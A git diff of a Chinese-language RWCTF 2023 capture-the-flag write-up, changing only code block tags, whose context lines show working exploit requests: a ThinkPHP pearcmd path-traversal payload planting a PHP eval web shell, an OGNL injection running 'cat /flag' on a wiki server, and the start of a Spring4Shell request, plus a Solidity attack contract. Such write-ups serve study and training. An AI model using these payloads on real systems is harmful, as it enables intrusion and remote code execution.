@@ -16,7 +16,7 @@ slug: "rwctf-2023-su-wu"
 
 具体的攻击合约代码与脚本如下：
 Hacker.sol:
-```
+```solidity
 pragma solidity ^0.8.0;
 
 import "./Happy.sol";
@@ -113,7 +113,7 @@ hacker.ReadOnlyCallFunction("isSolved")
 
 ```
 运行日志：
-```
+```text
 2023-01-07 22:54:28.246 | SUCCESS  | Poseidon.Blockchain:__init__:37 - 
 [Chain][Connect]Successfully connected to [http://118.31.7.155:8545]. [Delay] 104 ms
 2023-01-07 22:54:28.443 | SUCCESS  | Poseidon.Blockchain:GetBasicInformation:55 - 
@@ -200,7 +200,7 @@ apktools 反编译得到smai代码，然后把图中this.length>55条件取反�
 
 ## Be-a-Language-Expert
 tp已知洞
-```
+```http
 GET /?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['a']);?>+/tmp/b.php HTTP/1.1
 Host: 47.98.124.175:8080
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
@@ -218,12 +218,12 @@ Cache-Control: no-cache
 曲线方程数学公式: $ y^{2}=x^{3}+2x^{2}+x $，离散对数4470735776084208177429085432176719338，计算子群的阶，找真正的离散对数值。
 
 ## Be-a-Wiki-Hacker
-```
+```http
 GET  //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/flag%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
 ```
 
 ## Spring4Shell
-```
+```http
 POST / HTTP/1.1
 Host: 47.98.216.107:35061
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
